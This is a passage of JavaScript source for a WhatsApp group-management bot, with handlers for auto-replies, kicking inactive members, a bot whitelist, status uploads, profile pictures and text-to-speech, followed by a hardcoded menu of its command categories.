  if (!config.autoReacts) config.autoReacts = {};
  if (emoji.toLowerCase() === 'off') {
    delete config.autoReacts[jid];
    await reply('✅ Auto‑react disabled.');
  } else {
    config.autoReacts[jid] = emoji;
    await reply(`✅ Auto‑react set to ${emoji}`);
  }
  break;
}

case 'autoreply': {
  if (needGroup() || needAdmin()) break;
  const state = args[0]?.toLowerCase();
  if (!['on','off'].includes(state)) { await reply('Usage: .autoreply on/off'); break; }
  const config = cfg(sock);
  if (!config.groupFlags) config.groupFlags = {};
  if (!config.groupFlags[jid]) config.groupFlags[jid] = {};
  config.groupFlags[jid].autoreply = (state === 'on');
  await reply(`✅ Auto‑reply ${state.toUpperCase()}`);
  break;
}

case 'setautoreply': {
  if (needGroup() || needAdmin()) break;
  const text = args.join(' ');
  if (!text) { await reply('Usage: .setautoreply <reply text>'); break; }
  const config = cfg(sock);
  if (!config.autoReplyTexts) config.autoReplyTexts = {};
  config.autoReplyTexts[jid] = text;
  await reply(`✅ Auto‑reply text saved.`);
  break;
}

case 'kickinactive2': {
  if (needGroup() || needAdmin() || needBotAdm()) break;
  const days = parseInt(args[0]) || 7;
  const actFile = DB('activity.json');
  const act = readJSON(actFile, {});
  const cutoff = Date.now() - days * 86400000;
  const inactive = participants
    .filter(p => !p.admin)
    .map(p => p.id || p.jid)
    .filter(pjid => {
      const key = `${jid}|${normNum(pjid)}`;
      return !act[key] || act[key] < cutoff;
    });
  if (!inactive.length) { await reply(`✅ No inactive members (>${days} days) found.`); break; }
  await reply(`⚠️ Kicking *${inactive.length}* members inactive for >${days} days...`);
  let done = 0;
  for (const t of inactive) {
    try { await sock.groupParticipantsUpdate(jid, [t], 'remove'); done++; await new Promise(r => setTimeout(r, 500)); } catch {}
  }
  await reply(`✅ Kicked *${done}* inactive members.`);
  break;
}

case 'reportadmin': {
  if (needGroup()) break;
  const issue = args.join(' ');
  if (!issue) { await reply('Usage: .reportadmin <issue>'); break; }
  // Forward to all admins (or owner)
  const admins = groupAdmins;
  if (!admins.length) { await reply('❌ No admins found.'); break; }
  for (const admin of admins) {
    try {
      await sock.sendMessage(admin, {
        text: `📢 *Report from ${pushname} (${senderNumber})*\nGroup: ${groupName}\nIssue: ${issue}`
      });
    } catch {}
  }
  await reply('✅ Report sent to admins.');
  break;
}

case 'requestrole': {
  if (needGroup()) break;
  const role = args.join(' ') || 'admin';
  // Send a request to group admins
  const admins = groupAdmins;
  if (!admins.length) { await reply('❌ No admins found.'); break; }
  for (const admin of admins) {
    try {
      await sock.sendMessage(admin, {
        text: `📩 *Role Request from ${pushname} (${senderNumber})*\nGroup: ${groupName}\nRequested role: ${role}`
      });
    } catch {}
  }
  await reply('✅ Role request sent to admins.');
  break;
}

case 'voteban': {
  if (needGroup() || needAdmin()) break;
  const target = getTargetJid(m, args);
  if (!target) { await reply('❌ Reply to or mention a member.'); break; }
  // Simple implementation: ask for votes via reactions or replies
  // This is a placeholder – you can expand with a proper voting system
  await reply(`🗳️ Vote to ban @${normNum(target)}: React ✅ to ban, ❌ to cancel. (60s)`);
  // In real implementation you'd listen for reactions and count
  break;
}

case 'addbot': {
  if (needGroup() || needAdmin()) break;
  const target = getTargetJid(m, args);
  if (!target) { await reply('❌ Reply to or mention a bot number.'); break; }
  const botFile = DB('botlist.json');
  const bots = readJSON(botFile, {});
  if (!bots[jid]) bots[jid] = [];
  if (bots[jid].includes(target)) { await reply('⚠️ Already whitelisted.'); break; }
  bots[jid].push(target);
  writeJSON(botFile, bots);
  await reply(`✅ Bot @${normNum(target)} added to whitelist.`);
  break;
}

case 'removebot': {
  if (needGroup() || needAdmin()) break;
  const target = getTargetJid(m, args);
  if (!target) { await reply('❌ Reply to or mention a bot number.'); break; }
  const botFile = DB('botlist.json');
  const bots = readJSON(botFile, {});
  if (!bots[jid]) { await reply('⚠️ No bots in whitelist.'); break; }
  bots[jid] = bots[jid].filter(j => j !== target);
  writeJSON(botFile, bots);
  await reply(`✅ Bot @${normNum(target)} removed from whitelist.`);
  break;
}

case 'listbots': {
  if (needGroup() || needAdmin()) break;
  const botFile = DB('botlist.json');
  const bots = readJSON(botFile, {});
  const list = bots[jid] || [];
  if (!list.length) { await reply('📭 No bots whitelisted.'); break; }
  const msg = list.map((j, i) => `${i+1}. @${normNum(j)}`).join('\n');
  await reply(`🤖 *Whitelisted Bots (${list.length})*\n\n${msg}`);
  break;
}

case 'setrulesimg': {
  if (needGroup() || needAdmin()) break;
  const { qMsg, qType } = getQuoted(m);
  if (qType !== 'imageMessage') { await reply('❌ Reply to an image.'); break; }
  try {
    const buf = await dlMedia({ imageMessage: qMsg.imageMessage }, m.key);
    const url = await uploadToCatbox(buf, 'rules.jpg');
    const config = cfg(sock);
    if (!config.rulesImages) config.rulesImages = {};
    config.rulesImages[jid] = url;
    await reply(`✅ Rules image set: ${url}`);
  } catch (e) { await reply(`❌ ${e.message}`); }
  break;
}

case 'clearrules': {
  if (needGroup() || needAdmin()) break;
  const config = cfg(sock);
  if (config.rules) delete config.rules[jid];
  if (config.rulesImages) delete config.rulesImages[jid];
  await reply('✅ Rules cleared.');
  break;
}

case 'unmuteall': {
  if (needGroup() || needAdmin() || needBotAdm()) break;
  try {
    await sock.groupSettingUpdate(jid, 'not_announcement');
    await reply('🔊 Everyone unmuted.');
  } catch (e) { await reply(`❌ ${e.message}`); }
  break;
}

case 'allmsg': {
  if (needGroup() || needAdmin()) break;
  const msg = args.join(' ') || '📢 Announcement from admin';
  const mentions = participants.map(p => p.id || p.jid).filter(Boolean);
  await sock.sendMessage(jid, { text: msg, mentions });
  break;
}
    case 'uploadstatus': {
      if (needOwner()) break;
      const { qMsg, qType, qKey } = getQuoted(m);
      try {
        if (qType === 'imageMessage') {
          const buf = await dlMedia({ imageMessage: qMsg.imageMessage }, qKey);
          await sock.sendMessage('status@broadcast', { image: buf, caption: qMsg.imageMessage?.caption || '' });
        } else if (qType === 'videoMessage') {
          const buf = await dlMedia({ videoMessage: qMsg.videoMessage }, qKey);
          await sock.sendMessage('status@broadcast', { video: buf, caption: qMsg.videoMessage?.caption || '' });
        } else {
          const t2 = text || qMsg?.conversation || qMsg?.extendedTextMessage?.text || '';
          if (!t2) { await reply('Provide text or reply to media.'); break; }
          await sock.sendMessage('status@broadcast', { text: t2 }, { backgroundColor: '#128C7E', font: 3 });
        }
        await reply('✅ Status uploaded.');
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    case 'setmypp': {
      const { qMsg, qType, qKey } = getQuoted(m);
      const ownImg = m.message?.imageMessage;
      let buf = null;
      try {
        if (ownImg) {
          buf = await dlMedia({ imageMessage: ownImg }, m.key);
        } else if (qType === 'imageMessage') {
          buf = await dlMedia({ imageMessage: qMsg.imageMessage }, qKey);
        } else if (args[0]?.startsWith('http')) {
          buf = await getBuffer(args[0]);
        } else { await reply(`Reply to an image or ${prefix}setmypp <url>`); break; }
        if (!buf || buf.length < 100) throw new Error('Image buffer empty');
        let finalBuf = buf;
        try {
          const sharp = require('sharp');
          finalBuf = await sharp(buf).resize(640, 640, { fit: 'cover' }).jpeg({ quality: 90 }).toBuffer();
        } catch { finalBuf = buf; }
        await sock.updateProfilePicture(jid, finalBuf);
        await reply('✅ Profile picture updated.');
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    case 'getpp': {
      const t = getTargetJid(m, args);
      const target = t || `${botNumber}@s.whatsapp.net`;
      try {
        const ppUrl = await sock.profilePictureUrl(target, 'image');
        const r = await axios.get(ppUrl, { responseType: 'arraybuffer', timeout: 10000 });
        await replyImg(Buffer.from(r.data), `🖼 +${normNum(target)}`);
      } catch { await reply('❌ No profile picture or privacy restricted.'); }
      break;
    }

    case 'tts': {
      if (!text) { await reply(`${prefix}tts <text>`); break; }
      if (text.length >= 300) { await reply('❌ Max 300 characters.'); break; }
      await reply('⏳ Generating voice...');
      try {
        const { data } = await axios.post(
          'https://tiktok-tts.weilnet.workers.dev/api/generation',
          { text, voice: 'id_001' },
          { timeout: 15000 }
        );
        if (!data?.data) throw new Error('No audio returned');
        await sock.sendMessage(jid, {
          audio: Buffer.from(data.data, 'base64'),
          mimetype: 'audio/mp4',
        }, { quoted: qchanel });
      } catch (e) { await reply('❌ TTS failed: ' + e.message); }
      break;
    }
case 'cards':
case 'cc': {
  await reaction('🌹');

  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

  try {
    console.log('[CASUAL] Building casual carousel from categoryBoxes...');

    const {
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      proto,
    } = require('@whiskeysockets/baileys');

    const myUptime = formatUptime(Date.now() - global.botStartTime);
    const botName = c.botName || settings.BOT_NAME || '𝐁𝐋𝐀𝐂𝐊𝐋𝐎𝐑𝐃  𝐓𝐀𝐋𝐊𝐋𝐄𝐒𝐒';
    const prefix = c.prefix || settings.DEFAULT_PREFIX || '.';

    // ── Full hardcoded category boxes ──
    const categoryBoxes = [
      {
        title: 'OWNER',
        text: `
> ╭═━⪩ 〖  𝑶𝑾𝑵𝑬𝑹  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒔𝒆𝒕𝒔𝒕𝒊𝒄𝒌𝒆𝒓
> │❍ 𝒑𝒓𝒆𝒇𝒊𝒙𝒇𝒓𝒆𝒆
> │❍ 𝒔𝒆𝒕𝒑𝒓𝒆𝒇𝒊𝒙
> │❍ 𝒔𝒆𝒕𝒐𝒘𝒏𝒆𝒓
> │❍ 𝒔𝒆𝒕𝒃𝒐𝒕𝒏𝒂𝒎𝒆
> │❍ 𝒔𝒆𝒕𝒎𝒆𝒏𝒖𝒊𝒎𝒈
> │❍ 𝒔𝒆𝒕𝒃𝒐𝒕𝒊𝒎𝒈
> │❍ 𝒔𝒆𝒕𝒇𝒐𝒏𝒕𝒔
> │❍ 𝒑𝒖𝒃𝒍𝒊𝒄
> │❍ 𝒔𝒆𝒍𝒇
> │❍ 𝒂𝒅𝒅𝒑𝒓𝒆𝒎
> │❍ 𝒅𝒆𝒍𝒑𝒓𝒆𝒎
> │❍ 𝒂𝒏𝒕𝒊𝒅𝒆𝒍𝒆𝒕𝒆
> │❍ 𝒊𝒑𝒉𝒐𝒏𝒆𝒎𝒐𝒅𝒆
> │❍ 𝒂𝒖𝒕𝒐𝒗𝒊𝒆𝒘𝒔𝒕𝒂𝒕𝒖𝒔
> │❍ 𝒂𝒖𝒕𝒐𝒍𝒊𝒌𝒆𝒔𝒕𝒂𝒕𝒖𝒔
> │❍ 𝒂𝒏𝒕𝒊𝒄𝒂𝒍𝒍
> │❍ 𝒃𝒍𝒐𝒄𝒌
> │❍ 𝒖𝒏𝒃𝒍𝒐𝒄𝒌
> │❍ 𝒍𝒊𝒔𝒕𝒃𝒍𝒐𝒄𝒌𝒆𝒅
> │❍ 𝒃𝒓𝒐𝒂𝒅𝒄𝒂𝒔𝒕
> │❍ 𝒑𝒂𝒊𝒓
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐`
      },
      {
        title: 'GROUP',
        text: `
> ╭═━⪩ 〖  𝑮𝑹𝑶𝑼𝑷  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒑𝒓𝒐𝒎𝒐𝒕𝒆
> │❍ 𝒅𝒆𝒎𝒐𝒕𝒆
> │❍ 𝒌𝒊𝒄𝒌
> │❍ 𝒎𝒖𝒕𝒆
> │❍ 𝒖𝒏𝒎𝒖𝒕𝒆
> │❍ 𝒕𝒂𝒈𝒂𝒍𝒍
> │❍ 𝒕𝒂𝒈𝒂𝒅𝒎𝒊𝒏𝒔
> │❍ 𝒈𝒓𝒐𝒖𝒑𝒍𝒊𝒏𝒌
> │❍ 𝒓𝒆𝒗𝒐𝒌𝒆
> │❍ 𝒈𝒓𝒐𝒖𝒑𝒊𝒏𝒇𝒐
> │❍ 𝒔𝒆𝒕𝒈𝒏𝒂𝒎𝒆
> │❍ 𝒔𝒆𝒕𝒈𝒅𝒆𝒔𝒄
> │❍ 𝒉𝒊𝒅𝒆𝒕𝒂𝒈
> │❍ 𝒘𝒂𝒓𝒏
> │❍ 𝒓𝒆𝒔𝒆𝒕𝒘𝒂𝒓𝒏
> │❍ 𝒘𝒂𝒓𝒏𝒊𝒏𝒈𝒔
> │❍ 𝒂𝒏𝒕𝒊𝒍𝒊𝒏𝒌
> │❍ 𝒂𝒏𝒕𝒊𝒎𝒆𝒅𝒊𝒂
> │❍ 𝒘𝒆𝒍𝒄𝒐𝒎𝒆
> │❍ 𝒈𝒐𝒐𝒅𝒃𝒚𝒆
> │❍ 𝒍𝒐𝒄𝒌
> │❍ 𝒖𝒏𝒍𝒐𝒄𝒌
> │❍ 𝒆𝒗𝒆𝒓𝒚𝒐𝒏𝒆
> │❍ 𝒂𝒅𝒎𝒊𝒏𝒔
> │❍ 𝒍𝒊𝒔𝒕𝒈𝒓𝒐𝒖𝒑𝒔
> │❍ 𝒎𝒆𝒎𝒃𝒆𝒓𝒔
> │❍ 𝒂𝒑𝒑𝒓𝒐𝒗𝒆𝒂𝒍𝒍
> │❍ 𝒓𝒆𝒋𝒆𝒄𝒕𝒂𝒍𝒍
> │❍ 𝒄𝒉𝒆𝒄𝒌𝒑𝒆𝒏𝒅𝒊𝒏𝒈
> │❍ 𝒅𝒊𝒔𝒂𝒑
> │❍ 𝒂𝒏𝒕𝒊𝒎𝒆𝒏𝒕𝒊𝒐𝒏
> │❍ 𝒂𝒏𝒕𝒊𝒔𝒑𝒂𝒎
> │❍ 𝒂𝒏𝒕𝒊𝒃𝒐𝒕
> │❍ 𝒔𝒍𝒐𝒘𝒎𝒐𝒅𝒆
> │❍ 𝒆𝒏𝒅𝒑𝒐𝒍𝒍
> │❍ 𝒔𝒆𝒕𝒘𝒆𝒍𝒄𝒐𝒎𝒆𝒎𝒔𝒈
> │❍ 𝒔𝒆𝒕𝒈𝒐𝒐𝒅𝒃𝒚𝒆𝒎𝒔𝒈
> │❍ 𝒌𝒊𝒄𝒌𝒊𝒏𝒂𝒄𝒕𝒊𝒗𝒆
> │❍ 𝒎𝒖𝒕𝒆𝒍𝒊𝒔𝒕
> │❍ 𝒔𝒐𝒇𝒕𝒃𝒂𝒏
> │❍ 𝒌𝒊𝒄𝒌𝒂𝒍𝒍
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐`
      },
      {
        title: 'UTILITY',
        text: `
> ╭═━⪩ 〖  𝑼𝑻𝑰𝑳𝑰𝑻𝒀  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒔𝒕𝒊𝒄𝒌𝒆𝒓
> │❍ 𝒕𝒐𝒊𝒎𝒈
> │❍ 𝒗𝒗
> │❍ 𝒒𝒓
> │❍ 𝒘𝒆𝒂𝒕𝒉𝒆𝒓
> │❍ 𝒕𝒓
> │❍ 𝒖𝒑𝒍𝒐𝒂𝒅𝒔𝒕𝒂𝒕𝒖𝒔
> │❍ 𝒔𝒆𝒕𝒎𝒚𝒑𝒑
> │❍ 𝒈𝒆𝒕𝒑𝒑
> │❍ 𝒕𝒕𝒔
> │❍ 𝒕𝒐𝒖𝒓𝒍
> │❍ 𝒐𝒄𝒓
> │❍ 𝒔𝒉𝒐𝒓𝒕𝒆𝒏
> │❍ 𝒇𝒓𝒊𝒆𝒏𝒅𝒔
> │❍ 𝒑𝒍𝒂𝒚
> │❍ 𝒑𝒍𝒂𝒚𝒅𝒐𝒄
> │❍ 𝒊𝒅𝒄𝒉
> │❍ 𝒍𝒚𝒓𝒊𝒄𝒔
> │❍ 𝒊𝒎𝒂𝒈𝒊𝒏𝒆
> │❍ 𝒄𝒂𝒓𝒃𝒐𝒏
> │❍ 𝒊𝒏𝒔𝒕𝒂𝒈𝒓𝒂𝒎
> │❍ 𝒕𝒊𝒌𝒕𝒐𝒌
> │❍ 𝒇𝒂𝒄𝒆𝒃𝒐𝒐𝒌
> │❍ 𝒕𝒘𝒊𝒕𝒕𝒆𝒓
> │❍ 𝒑𝒊𝒏𝒕𝒆𝒓𝒆𝒔𝒕
> │❍ 𝒔𝒑𝒐𝒕𝒊𝒇𝒚
> │❍ 𝒚𝒕𝒎𝒑𝟒
> │❍ 𝒃𝒂𝒔𝒆𝟔𝟒
> │❍ 𝒖𝒏𝒃𝒂𝒔𝒆𝟔𝟒
> │❍ 𝒘𝒉𝒐𝒊𝒔
> │❍ 𝒓𝒆𝒗𝒆𝒓𝒔𝒆𝒈𝒊𝒇
> │❍ 𝒂𝒕𝒕𝒑
> │❍ 𝒆𝒎𝒐𝒋𝒊𝒎𝒊𝒙
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐`
      },
      {
        title: 'FUN',
        text: `
> ╭═━⪩ 〖  𝑭𝑼𝑵  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒋𝒐𝒌𝒆
> │❍ 𝒇𝒂𝒄𝒕
> │❍ 𝒒𝒖𝒐𝒕𝒆
> │❍ 𝒅𝒂𝒓𝒆
> │❍ 𝒕𝒓𝒖𝒕𝒉
> │❍ 𝒓𝒊𝒅𝒅𝒍𝒆
> │❍ 𝒓𝒐𝒂𝒔𝒕
> │❍ 𝒔𝒉𝒊𝒑
> │❍ 𝒄𝒐𝒊𝒏𝒇𝒍𝒊𝒑
> │❍ 𝒅𝒊𝒄𝒆
> │❍ 𝒎𝒂𝒈𝒊𝒄𝟖
> │❍ 𝒉𝒐𝒓𝒐𝒔𝒄𝒐𝒑𝒆
> │❍ 𝒎𝒆𝒎𝒆
> │❍ 𝒄𝒂𝒕
> │❍ 𝒅𝒐𝒈
> │❍ 𝒘𝒂𝒊𝒇𝒖
> │❍ 𝒂𝒏𝒊𝒎𝒆
> │❍ 𝒕𝒓𝒊𝒗𝒊𝒂
> │❍ 𝒄𝒐𝒎𝒑𝒍𝒊𝒎𝒆𝒏𝒕
> │❍ 𝒃𝒐𝒓𝒆𝒅
> │❍ 𝒓𝒑𝒔
> │❍ 𝒎𝒂𝒕𝒉
> │❍ 𝒕𝒚𝒑𝒆𝒓𝒂𝒄𝒆𝒓
> │❍ 𝒏𝒆𝒗𝒆𝒓𝒉𝒂𝒗𝒆𝒊𝒆𝒗𝒆𝒓
> │❍ 𝒘𝒐𝒖𝒍𝒅𝒚𝒐𝒖𝒓𝒂𝒕𝒉𝒆𝒓
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐`
      },
      {
        title: 'REACTIONS',
        text: `
> ╭═━⪩ 〖  𝑹𝑬𝑨𝑪𝑻𝑰𝑶𝑵𝑺  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒉𝒖𝒈
> │❍ 𝒌𝒊𝒔𝒔
> │❍ 𝒔𝒍𝒂𝒑
> │❍ 𝒑𝒂𝒕
> │❍ 𝒑𝒐𝒌𝒆
> │❍ 𝒄𝒖𝒅𝒅𝒍𝒆
> │❍ 𝒃𝒊𝒕𝒆
> │❍ 𝒃𝒍𝒖𝒔𝒉
> │❍ 𝒄𝒓𝒚
> │❍ 𝒅𝒂𝒏𝒄𝒆
> │❍ 𝒘𝒂𝒗𝒆
> │❍ 𝒘𝒊𝒏𝒌
> │❍ 𝒍𝒂𝒖𝒈𝒉
> │❍ 𝒔𝒎𝒊𝒍𝒆
> │❍ 𝒂𝒏𝒈𝒓𝒚
> │❍ 𝒔𝒂𝒅
> │❍ 𝒔𝒄𝒂𝒓𝒆𝒅
> │❍ 𝒔𝒍𝒆𝒆𝒑
> │❍ 𝒏𝒐𝒅
> │❍ 𝒏𝒐𝒎
> │❍ 𝒍𝒊𝒄𝒌
> │❍ 𝒑𝒖𝒏𝒄𝒉
> │❍ 𝒌𝒊𝒄𝒌
> │❍ 𝒕𝒉𝒓𝒐𝒘
> │❍ 𝒔𝒉𝒐𝒐𝒕
> │❍ 𝒇𝒂𝒄𝒆𝒑𝒂𝒍𝒎
> │❍ 𝒉𝒂𝒏𝒅𝒔𝒉𝒂𝒌𝒆
> │❍ 𝒉𝒊𝒈𝒉𝒇𝒊𝒗𝒆
> │❍ 𝒑𝒐𝒖𝒕
> │❍ 𝒔𝒕𝒂𝒓𝒆
> │❍ 𝒕𝒉𝒊𝒏𝒌
> │❍ 𝒔𝒉𝒓𝒖𝒈
> │❍ 𝒔𝒊𝒈𝒉
> │❍ 𝒃𝒐𝒓𝒆𝒅
> │❍ 𝒆𝒙𝒄𝒊𝒕𝒆𝒅
> │❍ 𝒄𝒐𝒏𝒇𝒖𝒔𝒆𝒅
> │❍ 𝒄𝒉𝒆𝒆𝒓
> │❍ 𝒚𝒂𝒘𝒏
> │❍ 𝒓𝒖𝒏
> │❍ 𝒏𝒐𝒔𝒆𝒃𝒍𝒆𝒆𝒅
> │❍ 𝒇𝒂𝒊𝒏𝒕
> │❍ 𝒄𝒆𝒍𝒆𝒃𝒓𝒂𝒕𝒆
> │❍ 𝒍𝒐𝒗𝒆
> │❍ 𝒌𝒊𝒍𝒍
> │❍ 𝒇𝒆𝒆𝒅
> │❍ 𝒉𝒐𝒍𝒅
> │❍ 𝒑𝒊𝒏𝒄𝒉
> │❍ 𝒄𝒂𝒓𝒓𝒚
> │❍ 𝒕𝒊𝒄𝒌𝒍𝒆
> │❍ 𝒑𝒓𝒐𝒕𝒆𝒄𝒕
> │❍ 𝒎𝒊𝒔𝒔
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐`
      },
      {
        title: 'ADMIN',
        text: `
> ╭═━⪩ 〖  𝑨𝑫𝑴𝑰𝑵  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒔𝒆𝒕𝒓𝒖𝒍𝒆𝒔𝒊𝒎𝒈
> │❍ 𝒄𝒍𝒆𝒂𝒓𝒓𝒖𝒍𝒆𝒔
> │❍ 𝒔𝒆𝒕𝒓𝒖𝒍𝒆𝒔
> │❍ 𝒓𝒖𝒍𝒆𝒔
> │❍ 𝒑𝒊𝒏𝒎𝒔𝒈
> │❍ 𝒖𝒏𝒑𝒊𝒏𝒎𝒔𝒈
> │❍ 𝒂𝒍𝒍𝒎𝒔𝒈
> │❍ 𝒅𝒆𝒍𝒎𝒔𝒈
> │❍ 𝒎𝒖𝒕𝒆𝒕𝒊𝒎𝒆
> │❍ 𝒖𝒏𝒎𝒖𝒕𝒆𝒂𝒍𝒍
> │❍ 𝒃𝒂𝒏𝒍𝒊𝒔𝒕
> │❍ 𝒖𝒏𝒃𝒂𝒏𝒂𝒍𝒍
> │❍ 𝒔𝒆𝒕𝒋𝒐𝒊𝒏𝒎𝒔𝒈
> │❍ 𝒔𝒆𝒕𝒍𝒆𝒂𝒗𝒆𝒎𝒔𝒈
> │❍ 𝒕𝒐𝒈𝒈𝒍𝒆𝒘𝒆𝒍𝒄𝒐𝒎𝒆
> │❍ 𝒕𝒐𝒈𝒈𝒍𝒆𝒈𝒐𝒐𝒅𝒃𝒚𝒆
> │❍ 𝒔𝒆𝒕𝒏𝒔𝒇𝒘
> │❍ 𝒂𝒏𝒕𝒊𝒏𝒔𝒇𝒘
> │❍ 𝒂𝒏𝒕𝒊𝒇𝒐𝒓𝒘𝒂𝒓𝒅
> │❍ 𝒂𝒏𝒕𝒊𝒇𝒂𝒌𝒆
> │❍ 𝒂𝒖𝒕𝒐𝒑𝒊𝒏
> │❍ 𝒂𝒖𝒕𝒐𝒓𝒆𝒂𝒄𝒕
> │❍ 𝒂𝒖𝒕𝒐𝒓𝒆𝒑𝒍𝒚
> │❍ 𝒔𝒆𝒕𝒂𝒖𝒕𝒐𝒓𝒆𝒑𝒍𝒚
> │❍ 𝒌𝒊𝒄𝒌𝒊𝒏𝒂𝒄𝒕𝒊𝒗𝒆𝟐
> │❍ 𝒘𝒂𝒓𝒏𝒓𝒆𝒔𝒆𝒕
> │❍ 𝒘𝒂𝒓𝒏𝒍𝒊𝒎𝒊𝒕
> │❍ 𝒔𝒆𝒕𝒘𝒂𝒓𝒏𝒍𝒊𝒎𝒊𝒕
> │❍ 𝒈𝒓𝒐𝒖𝒑𝒔𝒕𝒂𝒕
> │❍ 𝒓𝒆𝒑𝒐𝒓𝒕𝒂𝒅𝒎𝒊𝒏
> │❍ 𝒓𝒆𝒒𝒖𝒆𝒔𝒕𝒓𝒐𝒍𝒆
> │❍ 𝒗𝒐𝒕𝒆𝒃𝒂𝒏
> │❍ 𝒂𝒅𝒅𝒃𝒐𝒕
> │❍ 𝒓𝒆𝒎𝒐𝒗𝒆𝒃𝒐𝒕
> │❍ 𝒍𝒊𝒔𝒕𝒃𝒐𝒕𝒔
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐`
      },
      {
        title: 'ANIME',
        text: `
> ╭═━⪩ 〖  𝑨𝑵𝑰𝑴𝑬  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒏𝒂𝒓𝒖𝒕𝒐
> │❍ 𝒐𝒏𝒆𝒑𝒊𝒆𝒄𝒆
> │❍ 𝒄𝒐𝒔𝒑𝒍𝒂𝒚
> │❍ 𝒎𝒊𝒌𝒂𝒔𝒂
> │❍ 𝒏𝒆𝒛𝒖𝒌𝒐
> │❍ 𝒔𝒂𝒔𝒖𝒌𝒆
> │❍ 𝒊𝒕𝒂𝒄𝒉𝒊
> │❍ 𝒔𝒂𝒌𝒖𝒓𝒂
> │❍ 𝒉𝒊𝒏𝒂𝒕𝒂
> │❍ 𝒍𝒊𝒔𝒂
> │❍ 𝒎𝒂𝒅𝒂𝒓𝒂
> │❍ 𝒎𝒊𝒌𝒖
> │❍ 𝒂𝒌𝒊𝒚𝒂𝒎𝒂
> │❍ 𝒂𝒏𝒂
> │❍ 𝒂𝒓𝒕
> │❍ 𝒂𝒔𝒖𝒏𝒂
> │❍ 𝒃𝒐𝒓𝒖𝒕𝒐
> │❍ 𝒃𝒕𝒔
> │❍ 𝒄𝒂𝒓𝒕𝒐𝒐𝒏
> │❍ 𝒄𝒉𝒊𝒉𝒐
> │❍ 𝒄𝒉𝒊𝒕𝒐𝒈𝒆
> │❍ 𝒄𝒐𝒔𝒑𝒍𝒂𝒚𝒍𝒐𝒍𝒊
> │❍ 𝒄𝒐𝒔𝒑𝒍𝒂𝒚𝒔𝒂𝒈𝒊𝒓𝒊
> │❍ 𝒄𝒚𝒃𝒆𝒓
> │❍ 𝒅𝒆𝒊𝒅𝒂𝒓𝒂
> │❍ 𝒅𝒐𝒓𝒂𝒆𝒎𝒐𝒏
> │❍ 𝒆𝒍𝒂𝒊𝒏𝒂
> │❍ 𝒆𝒎𝒊𝒍𝒊𝒂
> │❍ 𝒆𝒓𝒛𝒂
> │❍ 𝒆𝒙𝒐
> │❍ 𝒈𝒂𝒎𝒆𝒘𝒂𝒍𝒍𝒑𝒂𝒑𝒆𝒓
> │❍ 𝒈𝒓𝒆𝒎𝒐𝒓𝒚
> │❍ 𝒉𝒂𝒄𝒌𝒆𝒓
> │❍ 𝒉𝒆𝒔𝒕𝒊𝒂
> │❍ 𝒉𝒖𝒔𝒃𝒖
> │❍ 𝒊𝒏𝒐𝒓𝒊
> │❍ 𝒊𝒔𝒍𝒂𝒎𝒊𝒄
> │❍ 𝒊𝒔𝒖𝒛𝒖
> │❍ 𝒊𝒕𝒐𝒓𝒊
> │❍ 𝒋𝒆𝒏𝒏𝒊𝒆
> │❍ 𝒋𝒊𝒔𝒐
> │❍ 𝒋𝒖𝒔𝒕𝒊𝒏𝒂
> │❍ 𝒌𝒂𝒈𝒂
> │❍ 𝒌𝒂𝒈𝒖𝒓𝒂
> │❍ 𝒌𝒂𝒌𝒂𝒔𝒊𝒉
> │❍ 𝒌𝒂𝒐𝒓𝒊
> │❍ 𝒌𝒆𝒏𝒆𝒌𝒊
> │❍ 𝒌𝒐𝒕𝒐𝒓𝒊
> │❍ 𝒌𝒖𝒓𝒖𝒎𝒊
> │❍ 𝒎𝒆𝒈𝒖𝒎𝒊𝒏
> │❍ 𝒎𝒊𝒌𝒆𝒚
> │❍ 𝒎𝒊𝒏𝒂𝒕𝒐
> │❍ 𝒎𝒐𝒖𝒏𝒕𝒂𝒊𝒏
> │❍ 𝒏𝒆𝒌𝒐𝟐
> │❍ 𝒏𝒆𝒌𝒐𝒏𝒊𝒎𝒆
> │❍ 𝒑𝒆𝒏𝒕𝒐𝒍
> │❍ 𝒑𝒐𝒌𝒆𝒎𝒐𝒏
> │❍ 𝒑𝒓𝒐𝒈𝒓𝒂𝒎𝒎𝒊𝒏𝒈
> │❍ 𝒓𝒂𝒏𝒅𝒐𝒎𝒏𝒊𝒎𝒆
> │❍ 𝒓𝒂𝒏𝒅𝒐𝒎𝒏𝒊𝒎𝒆𝟐
> │❍ 𝒓𝒊𝒛𝒆
> │❍ 𝒓𝒐𝒔𝒆
> │❍ 𝒔𝒂𝒈𝒊𝒓𝒊
> │❍ 𝒔𝒂𝒕𝒂𝒏𝒊𝒄
> │❍ 𝒔𝒉𝒊𝒏𝒂
> │❍ 𝒔𝒉𝒊𝒏𝒌𝒂
> │❍ 𝒔𝒉𝒊𝒏𝒐𝒎𝒊𝒚𝒂
> │❍ 𝒔𝒉𝒊𝒛𝒖𝒌𝒂
> │❍ 𝒔𝒉𝒐𝒕𝒂
> │❍ 𝒔𝒉𝒐𝒓𝒕𝒒𝒖𝒐𝒕𝒆
> │❍ 𝒔𝒑𝒂𝒄𝒆
> │❍ 𝒕𝒆𝒄𝒉𝒏𝒐𝒍𝒐𝒈𝒚
> │❍ 𝒕𝒆𝒋𝒊𝒏𝒂
> │❍ 𝒕𝒐𝒖𝒌𝒂𝒄𝒉𝒂𝒏
> │❍ 𝒕𝒔𝒖𝒏𝒂𝒅𝒆
> │❍ 𝒚𝒐𝒕𝒔𝒖𝒃𝒂
> │❍ 𝒚𝒖𝒌𝒊
